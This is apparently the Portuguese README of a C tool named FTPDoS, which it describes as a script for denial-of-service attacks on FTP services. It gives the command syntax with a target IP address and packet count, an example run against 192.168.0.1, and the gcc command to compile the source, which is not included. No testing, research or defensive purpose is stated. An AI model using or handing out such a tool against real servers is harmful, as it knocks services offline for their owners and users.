# FTPDoS
Script feito em C para DoS em serviços FTP

## Modo de uso
Você poder usar o já compilado com:
```sh
./ftpdos [IP] [QUANTIDADE DE PACOTES]
```

> Exemplo:
```sh
./ftpdos 192.168.0.1 500
```

ou pode compilar o seu a partir do codigo fonte:
```sh
gcc ftpdos.c -o ftpdos
```
